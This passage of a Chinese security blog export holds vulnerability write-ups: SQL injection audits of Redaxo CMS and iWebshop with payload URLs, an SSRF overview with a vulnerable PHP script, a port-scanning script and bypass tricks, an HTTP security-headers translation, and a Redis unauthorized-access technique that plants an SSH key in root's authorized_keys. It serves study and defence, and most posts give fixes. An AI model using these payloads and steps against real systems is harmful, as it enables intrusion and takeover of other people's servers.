'integer') * - 'double' * - 'string' * - 'float' * - 'real' * - 'object' * - 'array' * - 'array[&lt;type&gt;]', e.g. 'array[int]' * - '' (don't cast) * - a callable * - array( * array(&lt;key&gt;, &lt;vartype&gt;, &lt;default&gt;), * array(&lt;key&gt;, &lt;vartype&gt;, &lt;default&gt;), * ... * ) * * @param mixed $var Variable to cast * @param mixed $vartype Variable type * * @throws InvalidArgumentException * * @return mixed Castet value */ public static function cast($var, $vartype) &#123; if (is_string($vartype)) &#123; $casted = true; switch ($vartype) &#123; // ---------------- PHP types case 'bool': case 'boolean': $var = (boolean) $var; break; case 'int': case 'integer': $var = (int) $var; break; case 'double': $var = (double) $var; break; case 'float': case 'real': $var = (float) $var; break; case 'string': $var = (string) $var; break; case 'object': $var = (object) $var; break; case 'array': if ('' === $var) &#123; $var = []; &#125; else &#123; $var = (array) $var; &#125; break; // kein Cast, nichts tun case '': break; default: // check for array with generic type if (strpos($vartype, 'array[') === 0) &#123; if (empty($var)) &#123; $var = []; &#125; else &#123; $var = (array) $var; &#125; // check if every element in the array is from the generic type $matches = []; if (preg_match('@array\\[([^\\]]*)\\]@', $vartype, $matches)) &#123; foreach ($var as $key =&gt; $value) &#123; try &#123; $var[$key] = self::cast($value, $matches[1]); &#125; catch (InvalidArgumentException $e) &#123; // Evtl Typo im vartype, mit urspr. typ als fehler melden throw new InvalidArgumentException('Unexpected vartype \"' . $vartype . '\" in cast()!'); &#125; &#125; &#125; else &#123; throw new InvalidArgumentException('Unexpected vartype \"' . $vartype . '\" in cast()!'); &#125; &#125; else &#123; $casted = false; &#125; &#125; if ($casted) &#123; return $var; &#125; &#125; if (is_callable($vartype)) &#123; $var = call_user_func($vartype, $var); &#125; elseif (is_array($vartype)) &#123; $var = self::cast($var, 'array'); $newVar = []; foreach ($vartype as $cast) &#123; if (!is_array($cast) || !isset($cast[0])) &#123; throw new InvalidArgumentException('Unexpected vartype in cast()!'); &#125; $key = $cast[0]; $innerVartype = isset($cast[1]) ? $cast[1] : ''; if (array_key_exists($key, $var)) &#123; $newVar[$key] = self::cast($var[$key], $innerVartype); &#125; elseif (!isset($cast[2])) &#123; $newVar[$key] = self::cast('', $innerVartype); &#125; else &#123; $newVar[$key] = $cast[2]; &#125; &#125; $var = $newVar; &#125; elseif (is_string($vartype)) &#123; throw new InvalidArgumentException('Unexpected vartype \"' . $vartype . '\" in cast()!'); &#125; else &#123; throw new InvalidArgumentException('Unexpected vartype in cast()!'); &#125; return $var; &#125; 在$vartype为string的时候，直接强制转换了下就break跳出，return了，全部过程没看到安全过滤函数的干预，所以是存在严重SQL注入问题的。 验证访问 http://localhost:8888/redaxo-cms-5.0.0/redaxo/index.php?page=mediapool/media&amp;rex_file_category=0 在该页面右侧搜索框搜索任意字符串，post数据中参数media_name即为注入点，结合之前的分析，后端接收数据的方式为$_REQUEST，那么将media_name参数直接带到url后面以get方式请求也是可以被后端获取的。 http://localhost:8888/redaxo-cms-5.0.0/redaxo/index.php?page=mediapool/media&amp;rex_file_category=0&amp;media_name=abc%27)%20ORDER%20BY%2018+--+ order by 18报错，那么列的数目就是17，使用union select语句把页面回显位置显示出来 可以看到回显位置有10，14，16 总结这个漏洞比较有意思的地方来了，我留意到该cms选择的pdo方式连接数据库，那么怎么会出这样的sql注入问题呢？说完就抽了自己一大嘴瓜子，为什么不会出这样的sql注入问题呢？毕竟代码是人写的，下面就分析下为什么造成了sql注入。 首先这个锅是程序员的，明明选择了pdo方式连接数据库，但是写sql语句的时候却直接拼接了参数，而不是采用pdo的参数绑定或者prepare方式，从而造成了注入问题。 定位到/redaxo-cms-5.0.0/redaxo/src/addons/mediapool/pages/media.php，第600行-608行 123456789$qry = 'SELECT * FROM ' . $addTable . rex::getTablePrefix() . 'media f WHERE ' . $where . ' ORDER BY f.updatedate desc, f.id desc'; // ----- EXTENSION POINT $qry = rex_extension::registerPoint(new rex_extension_point('MEDIA_LIST_QUERY', $qry, [ 'category_id' =&gt; $rex_file_category, ])); $files = rex_sql::factory();// $files-&gt;setDebug(); $files-&gt;setQuery($qry); 看到$qry变量拼接了$where变量，而$where里面又拼接了$media_name变量，第586行 $where = &quot;(f.filename LIKE &apos;%&quot; . $media_name . &quot;%&apos; OR f.title LIKE &apos;%&quot; . $media_name . &quot;%&apos;)&quot;; 最后sql语句$qry变量传入了setQuery函数，找到setQuery函数的实现，定位到/redaxo-cms-5.0.0/redaxo/src/core/lib/sql/sql.php 123456789101112131415161718192021222324252627282930313233343536373839404142/** * Executes the given sql-query. * * If parameters will be provided, a prepared statement will be executed. * * example 1: * $sql-&gt;setQuery('SELECT * FROM mytable where id=:id, 'array('id' =&gt; 3)); * * NOTE: named-parameters/?-placeholders are not supported in LIMIT clause! * * @param string $query The sql-query * @param array $params An optional array of statement parameter * * @return $this * * @throws rex_sql_exception on errors */ public function setQuery($query, array $params = []) &#123; // Alle Werte zuruecksetzen $this-&gt;flush(); $this-&gt;query = $query; $this-&gt;params = $params; if (!empty($params)) &#123; $this-&gt;prepareQuery($query); $this-&gt;execute($params); &#125; else &#123; try &#123; $this-&gt;stmt = self::$pdo[$this-&gt;DBID]-&gt;query($query); $this-&gt;rows = $this-&gt;stmt-&gt;rowCount(); &#125; catch (PDOException $e) &#123; throw new rex_sql_exception('Error while executing statement \"' . $query . '! ' . $e-&gt;getMessage()); &#125; &#125; if ($this-&gt;debug) &#123; $this-&gt;printError($query, $params); &#125; return $this; &#125; 由于没有传递$params参数，所以if语句直接进入else逻辑，使用query直接执行了sql语句中我们拼接的恶意代码。 到这里其实还没完，又惊奇的发现sqlmap提供的payload里面使用了多语句，这让我想到了php+mysql多语句执行，mysql本身从4.1版本就已经开始支持多语句执行了，只是php自身限制了这种用法，虽然connect的时候可以设置CLIENT_MULTI_STATEMENTS，但是php在mysql_query/mysqli_query函数实现的源码级别仍然会去除掉该设置。但pdo方式连数据后默认是允许多语句执行的，但并不是完全没限制，因为pdo方式操作数据库都是采用参数绑定预编译sql语句的，而这种绑定是在客户端执行的，这种情况是不需要多语句执行的。以前在zone里面有一篇帖子 “真正可以利用的多语句注射，只能是存在于利用PDO连接数据库，并直接使用exec或者query函数进行执行sql语句的地方” 由于恰巧该cms在执行sql语句的时候未严格执行pdo标准使用参数绑定方式，而采用了直接拼接参数到sql语句，执行的时候直接使用了query函数，因此造成了多语句执行。","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"}]},{"title":"SSRF 攻击小结","slug":"Server-side-request-forgery","date":"2016-05-30T14:14:56.000Z","updated":"2017-01-09T16:17:18.000Z","comments":true,"path":"2016/05/30/Server-side-request-forgery/","link":"","permalink":"http://yoursite.com/2016/05/30/Server-side-request-forgery/","excerpt":"","text":"概述Server-Side Request Forgery即我们平常所说的SSRF攻击，翻译过来也就是服务器端请求伪造。漏洞的本质就是攻击者通过应用的正常功能（分享、转码、翻译、图片加载/下载、图片/文章收藏等）使服务器作为代理来访问到原本无法访问到的内网资源。 危害为了更清楚的认识到SSRF可以干什么，我写了个存在SSRF漏洞的PHP小程序 12345678910111213141516171819202122&lt;?php // getContent.phpif (isset($_POST['url'])) &#123; $url = $_POST['url']; $curl = curl_init(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($curl); curl_close($curl); $filename = 'user'.rand().'.txt'; file_put_contents($filename, $result); echo $result;&#125;?&gt; 代理访问该漏洞的本质就是可以利用存在漏洞服务器作为跳板去访问服务器所在内网的资源，于是可以用这作为判断是否存在SSRF漏洞的第一步，为什么说是第一步呢，因为我们利用SSRF是要获取到内网的信息，可能服务器允许本身请求其他域名（比如此处的ssrftest域名），但是对内网地址全部黑名单了，利用该SSRF是探测不到内网信息的，那么这就不能算漏洞了，所以，接下来可以尝试访问一些通过前期收集的内网域名，记录下数据包返回内容、数据包返回延时等，最终判断是否存在该漏洞。 然后在cloudeye上收到了日志，ip是我本地的出口ip，而本地浏览器网络接口只发起了一次到服务器的请求，说明日志是服务器端发起访问ssrftest域名生成的。 [29/May/2016:00:18:31 +0800] 123.122.x.x - - ssrftest.xxxxx.dnslog.info POST / HTTP/1.1 200 “-“ “-“ 攻击内网web应用（指纹识别、漏洞攻击）指纹识别其实就是访问一些已知系统（cms等）的特有文件/路径，来达到识别系统的效果。我在内网50机器上部署了一个web服务，如果该web服务存在使用get参数就能实现的漏洞（struts，sqli，xss…），那么就可以通过SSRF漏洞直接对web服务进行攻击。 对服务器内网所在机器进行端口扫描写了个py小程序，对目标机器的1-10000端口进行扫描 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python#coding=utf8# ssrf_port_scan.py# require library: requestsimport sysimport requestsvulSite = \"http://localhost:8888/getContent.php\"def portScan(host): print \"Scan \" + host for port in range(1,10000): payload = &#123; 'url': host + \":\" + str(port) &#125; try: res = requests.post(vulSite, data=payload, timeout=5) if res.text != \"\": print \"[+] port open: \" + str(port) else: pass except Exception, e: print str(e), \"port--&gt;\" + str(port) passdef main(host): portScan(host)if __name__ == '__main__': # 若不指定扫描host，则默认扫服务器本机 host = sys.argv[1] if len(sys.argv) == 2 else \"127.0.0.1\" main(host) 然后通过访问这些开放的端口，可以得到端口所部署的服务banner信息 本地文件读取可以利用file协议去读取本地文件，这里我以读/etc/passwd为例 绕过技巧利用URL特性一个完整的URL格式如下 scheme:[//[user:password@]host[:port]][/]path[?query][#fragment] 为了避免某些启用了BASIC认证的web服务弹出登录对话框，可以使用如下方式去访问URL，即将BASIC认证所需信息拼接到URL地址中 https://username:password@www.example.com/index.html 也就是说浏览器是支持something@domain这样格式的URL的，利用这个特性可以绕过服务器端对URL的简单过滤，可以看到，下图中实际访问的地址是ssrftest.xxx.dnslog.info。 xip.ioxip.io为任意ip地址提供了DNS泛解析 10.0.0.1.xip.io resolves to 10.0.0.1 www.10.0.0.1.xip.io resolves to 10.0.0.1 mysite.10.0.0.1.xip.io resolves to 10.0.0.1 foo.bar.10.0.0.1.xip.io resolves to 10.0.0.1 ip地址进制转换比如127.0.0.1的8进制=017700000001 防御 如果业务不需要从内部拿资源，那么就黑名单内网ip吧 限制请求协议仅为HTTP 控制返回信息，若正常业务请求的文件类型是特定的，那么在返回给用户前先验证下，避免被用户利用。若有报错信息，请直接返回统一error样式。 参考 http://drops.wooyun.org/papers/146 https://sobug.com/article/detail/11 http://www.freebuf.com/articles/web/20407.html","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"}]},{"title":"The Security of HTTP Headers","slug":"The-Security-of-HTTP-Headers","date":"2016-05-23T08:27:23.000Z","updated":"2017-01-09T16:16:54.000Z","comments":true,"path":"2016/05/23/The-Security-of-HTTP-Headers/","link":"","permalink":"http://yoursite.com/2016/05/23/The-Security-of-HTTP-Headers/","excerpt":"","text":"来源：http://www.contextis.com/resources/blog/security-http-headers 前言当谈论到web应用安全，我们经常考虑到的是：过滤用户的输入、加密渠道传递数据和使用安全的函数这些明显的点，而忽略在web安全上HTTP返回头部和现代web浏览器相结合产生的正面影响，这篇文章试图阐明HTTP Headers对web安全的主动和被动影响。 主动安全我们查阅OWASP推荐的HTTP Headers，下面这些headers能够被利用起来主动地增加web应用的安全性。 X-Frame-Options这个头部属性是告诉浏览器某个页面是否应该被展示在另一个页面中（比如在IFRAME标签中）。允许一个页面被加载在IFRAME中会造成点击劫持攻击的风险。攻击中目标站点被载入在背景位置，对受害者隐藏。然后受害者被引诱去网站上执行点击动作（例如通过一个调查或者抽奖），这些点击被处在背景位置的目标站点秘密的执行了。如果受害者当前是登录了目标站点的，那这些点击是带着用户的session被执行的。通过这样的方式能以用户身份执行命令，以及从用户资料里获取信息。 X-Frame-Options可以被设置为以下值： DENY SAMEORIGIN ALLOW-FROM 除非你的应用明确的需要在IFRAME里载入页面，否则请设置该头部值为DENY X-Frame-Options: DENY 如果你的应用使用IFRAME只是载入应用本身包含的（同源）页面，那么你应该设置该头部值为SAMEORIGIN X-Frame-Options: SAMEORIGIN 如果你的应用使用IFRAME需要载入非同源下的地址，那么你应该明确定义外部的源 X-Frame-Options: ALLOW-FROM contextis.co.uk 请注意X-Frame-Options头部的指令ALLOW-FROM接受一个确定的域名。没有协议，没有端口，没有路径和没有通配符。 兼容矩阵： Chrome Firefox Internet Explorer Opera Safari 4.0 3.6 8.0 10.5 4.0 Strict-Transport-Security这个头部经常缩写成HSTS（HTTP Strict Transport Security），告诉浏览器每当用户发送这个头部访问站点时强制使用HTTPS连接。所有主流浏览器都支持这个特性，并且应该： 仅仅通过HTTPS连接站点 转换站点所有的HTTP引用为HTTPS 在SSL证书错误时拒绝载入站点 此外还需要注意这个头部只能通过HTTPS响应进行设置，也就是说用户通过HTTPS至少连接过一次该站点。除非你做了一些特殊的准备，（比如说将域名添加到浏览器的预置HSTS域名列表）。同样重要的是要注意头部信息仅在一段时间内有效：过期时间以秒为单位，推荐如下设置半年，告诉浏览器去遵从STS。 Strict-Transport-Security: max-age=15768000 如果这条规则应该扩展到覆盖所有子域，那么可以通过在这个头部里面加入属性includeSubDomains： Strict-Transport-Security: max-age=15768000; includeSubDomains 一些浏览器（至少Chrome， Firefox，IE11/Edge 和 Safari）都有一个预加载列表，里面的URL都明确指定了他们想使用HSTS，如果用户打算访问该列表的这些URL，那么浏览器就会自动强制应用HSTS规则，尽管是第一次连接，否则可能会受到中间人攻击。把你的网站添加到预加载列表需要把URL提交到这个页面，并追加preload命令在到该头部里。例如： Strict-Transport-Security: max-age=15768000; includeSubDomains; preload X-XSS-Protection关于这个头部一直都饱受争议，甚至有人明确指定建议禁用它。那么，这个头部到底做了些什么呢？ 设置 X-XSS-Protection: 1 这个头部的目的是告诉浏览器利用其XSS防护。目前仅在Chrome，Internet Explorer 和 Safari浏览器有这样的内建引擎并且能识别该头部（Firefox似乎要依赖第三方插件NoScript）。 可能在浏览器端去过滤一些造成攻击的恶意请求看起来挺不错的，但是，其实过滤非常困难。尤其是在有人尝试试探性的检测恶意代码，过滤它并且同时又尽力维护站点正常工作。这将会导致一些过滤被绕过，甚至给先前健康的站点引入跨站脚本攻击。 设置 X-XSS-Protection: 1; mode=block 告诉浏览器不渲染整个页面，而是显示空白页。但是即使这样，由于方法早期有缺陷，从而导致一些大型站点（如facebook.com，live.com 和 slack.com）明确禁用XSS过滤器（X-XSS-Protection: 0）。 所以尽管很难对这个头部给出一个明确的建议，似乎看起来变体X-XSS-Protection: 1; mode=block的写法更加成熟些，而且已经摒弃了早期的缺陷。除此之外，针对跨站脚本攻击最好的防护仍然是过滤所有的输入和输出。 设置如下头部明确开启过滤器去过滤恶意的输入 X-XSS-Protection: 1; 设置如下头部阻止当前检测到恶意输入的站点 X-XSS-Protection: 1; mode=block 另外可以设置包含一个URL的report参数，如果Webkit-XSS-Auditors（Chrome，Safari）其中之一检测到攻击就会发送一个POST消息到URL，消息包含事件的详细信息： X-XSS-Protection: 1; mode=block; report=https://domain.tld/folder/file.ext 兼容矩阵 Chrome Firefox Internet Explorer Opera Safari 4.0 4.0 11 12 7 X-Content-Type-Options这个头部用来阻止特定版本的IE浏览器“嗅探”页面的MIME类型。它是IE浏览器的一个特性，当页面（Content-Type: text/plaintext）包含HTML标签时，浏览器将其作为HTML解释。然而，当处理用户提供的内容时引入了跨站脚本攻击的风险。这个头部仅有一个设置项nosniff，这样就阻止了浏览器嗅探页面的MIME类型。 X-Content-Type-Options: nosniff 兼容矩阵 Chrome Firefox Internet Explorer Opera Safari ? ? 8 ? ? Public-Key-PinsPublic-Key-Pins也叫作HTTP Public Key Pinning（缩写为HPKP）是相对较新的头部，还没有被广泛的使用。然而，它具有很强的安全潜能，因为它允许网站经营者指定（pin，密钥）一个有效的证书，减少对CA的依赖，在过去这种方式已经被证明是容易受到攻击的（如任何CA都可以创建一个技术上可行且受信任的证书，但是并不是由你指定的）。和HSTS一样，浏览器开始支持记住这个密钥，并且仅仅接受证书密钥和头部提供的秘钥匹配的网站连接。然而这意味着一个意想不到的证书改动会造成访问者被锁定在网站外。因此在第一个失败的时候很有必要提供一个可用的备份证书密钥。它也应该包含一个max-age属性，还有指定剩余时间（秒为单位），请记住，对不知情的用户这也可能是锁定时间。 Public-Key-Pins: pin-sha256=&quot;&lt;sha256&gt;&quot;; pin-sha256=&quot;&lt;sha256&gt;&quot;; max-age=15768000; 该规则如果要被扩展到覆盖所有子域，那么这个头部能通过添加属性includeSubDomains被扩展： Public-Key-Pins: pin-sha256=&quot;&lt;sha256&gt;&quot;; pin-sha256=&quot;&lt;sha256&gt;&quot;; max-age=15768000; includeSubDomains 兼容矩阵 Chrome Firefox Internet Explorer Opera Safari 35 35 \u0010 - 23 - Content-Security-Policy (取代 X-Content-Security-Policy 和 X-WebKit-CSP)Content-Security-Policy（缩写为CSP）是一个灵活的方式去指定站点哪些内容可能被执行，哪些内容不能被执行。现在的一个问题是浏览器并不知道哪个源值得信任，哪个源不能被信任。比如来自apis.google.com的包含第三方JavaScript是否值得信任？唯一合理的解决方式是白名单，由开发者指定合法的资源位置。下面是一个基本的例子如何允许来自于本地和apis.google.com的JavaScript Content-Security-Policy: script-src &apos;self&apos; https://apis.google.com CSP有一些额外的关键字，允许进行非常细粒度的访问控制，此外还要注意CSP是作为每个站点的模型，因此每一个站点都需要一个自己的HTTP头部集。 兼容矩阵 Chrome Firefox Internet Explorer Opera Safari 14 4 \u0010 10* /12 通过X-Content-Security-Policy 15 5.1* /7.1 通过X-Webkit-CSP 被动安全下面要介绍的头部并不会主动启用任何安全相关的特性，而是被动地影响着安全，通常通过这些头部会泄露不必要展示的信息。 Cookie attributes (HttpOnly and Secure)与cookie相关的一些特殊属性经常被忽视，而设置这些属性能很大程度上减少cookie被偷的风险。 HttpOnlyHttpOnly属性告诉浏览器拒绝JavaScript访问cookie，这使得通过跨站脚本攻击更加困难获取访问cookie Set-Cookie: cookie=xxxxxxxxx; HttpOnly Secure这个属性告诉浏览器仅在HTTPS连接的情况下发送cookie信息，这个应该是所有的会话和认证相关的cookie规范，因为它可以轻松拦截通过未加密的HTTP连接。 Set-Cookie: cookie=xxxxxxxxx; Secure 当然这些属性能被组合使用： Set-Cookie: cookie=xxxxxxxxx; HttpOnly; Secure Server / X-Powered-By这两个头部会显示在用的服务器软件和它的版本号，这些头部可能在调试的适合很有用，但是对用户体验没有任何用处，应该要么被去掉或者减少到不泄露任何版本信息。 Caching directives另一个经常被忽视的问题是浏览器缓存的敏感信息，浏览器经常存储网站元素到本地高速缓存以加速浏览体验。对一些不敏感的站点和元素比如图片或样式信息来说，这样是可以的，但是对于敏感信息（比如来自web应用认证区域的页面）要避免这样做。这个问题在共享计算机环境（比如说办公室，学校，网咖）下变得更糟糕，其他用户可以很容易的接触到你的浏览器缓存。要告诉浏览器（可能是中间缓存，如代理）不存储任何东西在它的缓存里面需要使用如下命令： Cache-Control: no-cache, no-store Expires: 0 Pragma: no-cache 要注意的是经常遇到的命令Cache-Control: private在共享计算机的环境中不能被认为是安全的，因为它允许浏览器去存储这些元素到他的缓存里面。 ETagEntity Tag（缩写ETag）头部是作缓存用途的，服务器使用特殊的算法为它提供的每个文件版本计算一个单独的ETag，浏览器然后能够请求服务器查看是否该ETag文件仍然可用，如果可用，服务器返回一个304状态码给浏览器，让它使用本地缓存的版本，否则服务器发送完整的资源和200状态码。 虽然这是一个有用的头部，你会发现有时会在漏洞相关的文章或报告对它的引用。问题是Apache的某些版本（2.3.14之前的版本中）用于披露对于在其默认的配置提供服务的文件索引节点\u0010。索引节点可用于进一步的攻击，例如通过网络文件系统（NFS），使用这些INode节点来创建文件句柄。有问题的默认配置已经在最近版本的Apache得到了纠正，但是你扔应该确保在httpd.conf里你相应的FileETag设置不包含INode属性。下面这行是好的设置： FileETag MTime Size 下面这行不是： FileETag INode MTime Size X-Robots-Tag 和 Robots.txtX-Robots-Tag头部能被用告诉搜索引擎（支持该头部）页面或文件如何被索引。和robots.txt或者robots的meta标签比起来，X-Robots-Tag的优点是它的头部能被全局配置，还可以调整到一个非常精细的和灵活的水平（比如正则表达式匹配特定的URL）。发送一个meta标签和媒体文件是不可能的，发送HTTP头部和媒体文件是没问题的。它还有优点就是在每个请求的基础上公开信息而不是在单一的文件上。试想一下，你不想让任何人知道的秘密目录，把它们列成一个清单在robots.txt文件上？也许因为一个不好的想法就会让所有人马上知道你想隐藏什么–你可能只是发了一个连接在你的网站上。 所以你应该干脆抛弃robots.txt而完全依赖X-Robots-Tag呢？或许不会，应该在最大兼容性下将他们组合使用。然而要记住，robots.txt应该仅仅包含你需要索引的文件和目录。你不应该列出哪些你想要隐藏的文件，相反的，可以放置一个不允许条目在robots.txt文件里。 阻止一切的例子： User-Agent: * Disallow: / 告诉爬虫索引/Public/目录下的所有文件，剩下的不让索引： User-Agent: * Allow: /Public/ Disallow: / 给不同的HTTP服务器添加自定义的头部下面你能找到关于如何在不同的HTTP服务器软件里设置静态自定义的HTTP头部的例子。 Apache对于Apache，推荐使用模块mod_headers去控制http头。命令Header能够被置于配置文件的任何地方，比如： &lt;Directory &quot;/var/www/dir1&quot;&gt; Options +Indexes Header set X-XSS-Protection “1; mode=block” &lt;/Directory&gt; 要更详细的了解关于如何使用mod_headers设置HTTP头的指导请参考这个页面 Internet Information Services (IIS)对于IIS 6.0-10.0，这里有两个方式设置自定义头部： 通过命令行 appcmd set config /section:httpProtocol /+customHeaders.[name=&apos;X-XSS-Protection&apos;,value=&apos;1; mode=block&apos;] 通过图形界面 打开IIS Manager，使用Conections面板找到你想要开启的头部合适的级别，双击HTTP Response Headers。现在单击Add…然后为这个头部设置你想要设置的名称和值。例子中名称将会是X-XSS-Protection，值将会是1; mode=block。 要更详细的了解关于如何使用IIS设置HTTP头的指导请参考这个页面 Lighttpd对于Lighttpd推荐使用模块mod_setenvs去控制apache头部，命令setenv.add-response-header能够被置于配置文件的任何地方，比如： setenv.add-response-header = ( &quot;X-XSS-Protection&quot; =&gt; &quot;1; mode=Block&quot; ) 要更详细的了解关于如何使用Lighttpd设置HTTP头的指导请参考这个页面 NGINX对于NGINX推荐使用模块ngx_http_headers_module去控制HTTP头，命令add_header能够被置于配置文件中合适的位置，比如： server { listen 80; server_name domain1.com www.domain1.com; root html; location / { add_header X-XSS-Protection “1; mode=Block” always } } 要更详细的了解关于使用NGINX设置HTTP头的指导请参考这个页面 总结和结论已经看到有或多或少的新的HTTP头能够主动的促进站点安全。我们还能看到有几个公认的头部可能值得重新审视，以减少被泄露的信息量。 参考 HTTP Strict Transport Security Pre-Load. Mozilla Developer Network – HTTP Headers. RFC6797: HTTP Strict Transport Security (HSTS). RFC7034: HTTP Header Field X-Frame-Options. RFC7469: Public Key Pinning Extension for HTTP. PS：没有完全一字一句的翻译，有些内容翻译不出那种味道，部分内容按照自己的理解整理的。","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"翻译","slug":"翻译","permalink":"http://yoursite.com/tags/翻译/"}]},{"title":"iWebshop 4.4 SQL 注入漏洞","slug":"iWebshop-4-4-SQL-Injection","date":"2016-05-20T14:21:09.000Z","updated":"2017-01-09T15:41:07.000Z","comments":true,"path":"2016/05/20/iWebshop-4-4-SQL-Injection/","link":"","permalink":"http://yoursite.com/2016/05/20/iWebshop-4-4-SQL-Injection/","excerpt":"","text":"0x01 背景iWebShop是一款基于PHP语言开发b2b2c开源多用户商城系统，支持平台自营和多商家入驻、微信商城系统、手机商城系统、移动端商城系统、APP商城系统等多功能性的购物平台系统。 0x02 审计框架简介 iWebshop是单一入口系统，所有的处理都要通过入口文件index.php来运行。系统框架对当前URL路径进行分析，找到controller(控制器)和action(动作)，去调用控制器文件里面的动作方法。在action动作中可以读取数据，处理业务逻辑，然后把完成的数据渲染到视图，给终端客户呈现出来。 漏洞概况 漏洞功能：后台-&gt;系统-&gt;配送方式-&gt;删除 漏洞文件：/controllers/system.php 审计 /controllers/system.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/** * @brief 配送方式删除和还原 */public function delivery_operate()&#123; $id = IReq::get('id'); $op = IReq::get('op'); if(is_array($id)) $id = implode(',',$id); if(empty($id)) &#123; if($op == 'del' || $op == 'recover') &#123; $this-&gt;redirect('delivery_recycle',false); &#125; else &#123; $this-&gt;redirect('delivery',false); &#125; Util::showMessage('请选择要操作的选项'); exit; &#125; $delivery = new IModel('delivery'); $deliveryData = $delivery-&gt;query('id in ('.$id.')','name'); $deliveryName = array(); foreach($deliveryData as $val) &#123; $deliveryName[] = $val['name']; &#125; $logObj = new log('db'); //物理删除 if($op=='del') &#123; $delivery-&gt;del('id in('.$id.')'); $logObj-&gt;write('operation',array(\"管理员:\".$this-&gt;admin['admin_name'],\"删除了回收站中的配送方式\",\"被删除的配送方式为：\".join(',',$deliveryName))); $this-&gt;redirect('delivery_recycle'); &#125; else if($op =='recover')//还原 &#123; $delivery-&gt;setData(array('is_delete'=&gt;0)); if($delivery-&gt;update('id in('.$id.')')) &#123; $logObj-&gt;write('operation',array('管理员:'.$this-&gt;admin['admin_name'],'恢复了回收站中的配送方式','被恢复的配送方式为：'.join(',',$deliveryName))); &#125; $this-&gt;redirect('delivery_recycle'); &#125; else//逻辑删除 &#123; $delivery-&gt;setData(array('is_delete'=&gt;1)); if($delivery-&gt;update('id in('.$id.')')) &#123; $logObj-&gt;write('operation',array(\"管理员:\".$this-&gt;admin['admin_name'],\"把配送方式移除到回收站中\",\"被移除到回收站中的配送方式为：\".join(',',$deliveryName))); &#125; $this-&gt;redirect('delivery'); &#125;&#125; 跟进$id = IReq::get(&#39;id&#39;); /lib/core/util/req_class.php 1234567891011121314151617181920212223242526272829303132333435363738/** * @class IReq * @brief 获取$_GET,$_POST的数据 */class IReq&#123; /** * @brief 获取键为$key的 $_GET 和 $_POST 传送方式的数据 * @param string $key $_GET 或 $_POST 的键 * @param string $type 传送方式 值: false:默认(先get后post); get:get方式; post:post方式; * @return string $_GET 或者 $_POST 的值 * @note 优先获取 $_GET 方式的数据,如果不存在则获取 $_POST 方式的数据 */ public static function get($key, $type=false) &#123; //默认方式 if($type==false) &#123; if(isset($_GET[$key])) return $_GET[$key]; else if(isset($_POST[$key])) return $_POST[$key]; else return null; &#125; //get方式 else if($type=='get' &amp;&amp; isset($_GET[$key])) return $_GET[$key]; //post方式 else if($type=='post' &amp;&amp; isset($_POST[$key])) return $_POST[$key]; //无匹配 else return null; &#125; ...&#125; 此处获取$_GET参数后是没有任何过滤直接返回值的。再回到delivery_operate函数，$deliveryData = $delivery-&gt;query(&#39;id in (&#39;.$id.&#39;)&#39;,&#39;name&#39;);可以看到$id被直接带入了SQL语句中，造成了SQL注入问题。 0x03 漏洞验证由于此处是删除（逻辑删除）操作，没有回显，不过可以构造如下请求验证漏洞 http://localhost:8888/iwebshop4.4/index.php?controller=system&amp;action=delivery_operate&amp;id=2) and if(1=1, sleep(4), 0)# 请求效果如下 poc中只指定sleep 4s 可是这个请求一共消耗了8s，这是由于delivery_operate函数中在query/select后又进行了一次update操作，所以该poc代码执行了两次（共8s），另外也可以通过mysql log也可以反馈8s的由来。 0x04 总结该漏洞产生的直接原因是$id变量未经过任何过滤就拼接SQL语句，因此一定要确保所有带入数据库的参数都经过了严格的过滤。当然，如果是PHP应用，推荐采用PDO方式操作数据库，使用参数绑定能有效的防止SQL Injection问题。","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"}]},{"title":"Redis crackIT 漏洞","slug":"Redis-crackIT","date":"2015-11-11T07:50:05.000Z","updated":"2017-01-14T03:29:58.000Z","comments":true,"path":"2015/11/11/Redis-crackIT/","link":"","permalink":"http://yoursite.com/2015/11/11/Redis-crackIT/","excerpt":"","text":"关于漏洞漏洞发生的前提： 1、Redis 服务暴露在公网 2、Redis 配置未设置口令或弱口令 3、Redis 配置文件未设置 Bind ip 4、Redis 服务所在机器开启了 SSH 服务，且默认 22 端口对外开放 说明：第1点中 Redis 服务暴露公网的情况下，若使用的是默认端口 6379，则很容易被黑客全网批量扫描到。 实验首先在一台虚拟机（inet 10.0.100.210）中安装了 redis，完全采用默认配置（意味着未设置 Bind ip，未设置口令） 12[root@localhost redis-3.0.5]# ps -ef | grep redisroot 4448 3629 0 15:24 pts/2 00:00:00 src/redis-server *:6379 另外，可以看到 Redis 还是以 root 用户启动运行的。 现在从另一台机器（inet 10.0.100.164）去攻击此台 Redis 服务器 0x01生成一个新的 SSH Public Key，并保存在文件foo.txt中 1(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") &gt; foo.txt 这里有换行是关键，体现在后面将内存数据导出到authorized_keys文件的时候 0x02将foo.txt内容写入 redis 内存，flushall 将清除数据库所有的 key，后面一步是将公钥保存给 crackit 0x03将内存中得数据导出到authorized_keys文件中 再去 Redis 服务所在的机器上去看 root 用户的authorized_keys 可以看到我的 Public Key 已经写到了这台机器的authorized_key里面了，从这里也可以看出如果当时第一步的时候foo.txt内保存的 Public Key 没有空行，那么得到的就是一串乱码了，尽管其中含有我的 Public Key，仍然不能登录，就像下面这个样子： 0x04成功登录 如何防御可以看到执行的命令都是 Redis 的一些正常功能，漏洞发生的本质还是配置不合理。Redis 的官方文档中明确指定了 具体如何防御可以根据前面提到的漏洞发生的前提针对性采取如下措施： 1、Redis 不要开放到公网访问 2、为 Redis 建立单独用户和强密码 3、为 Redis 绑定 ip 地址 4、Redis 所在服务器的 OpenSSH 服务（default port 22）不对外开放 当然对常见服务（Redis，MySQL，OpenSSH 等）修改其默认端口，在出现 Bug 